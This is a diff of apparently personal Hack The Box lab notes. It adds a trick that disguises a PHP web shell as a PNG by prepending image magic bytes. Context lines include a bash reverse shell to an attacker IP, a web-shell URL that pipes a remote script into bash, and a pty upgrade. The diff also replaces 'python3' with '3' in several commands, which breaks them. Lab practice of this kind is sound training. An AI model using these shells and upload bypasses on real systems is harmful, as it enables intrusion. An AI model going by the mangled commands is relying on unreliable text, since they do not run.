@@ -21,6 +21,11 @@ prompt OFF
 mget *
 ```
 
+```
+echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
+cat shell.php.png >> mime_shell.php.png
+```
+
 ## Foothold
 
 ## Privilege escalation
@@ -104,7 +109,7 @@ ss -tlpn
 Util:
 echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
 
-python3 -m http.server 8000
+3 -m http.server 8000
 
 ```
 
@@ -125,12 +130,12 @@ git clone https://github.com/SecureAuthCorp/impacket.git
 cd impacket
 pip3 install .
 # OR:
-sudo python3 setup.py install
+sudo 3 setup.py install
 # In case you are missing some modules:
 pip3 install -r requirements.txt
 
 cd impacket/examples/
-python3 mssqlclient.py -h
+3 mssqlclient.py -h
 
 SELECT is_srvrolemember('sysadmin');
 
@@ -189,8 +194,8 @@ bash -i >& /dev/tcp/10.10.14.116/4444 0>&1
 nc -nvlp 1337
 
 http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.23:8000/rs.sh|bash
-python3 -m http.server 8000
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+3 -m http.server 8000
+3 -c 'import pty;pty.spawn("/bin/bash")'
 
 #tunneling 
 local port forwarding
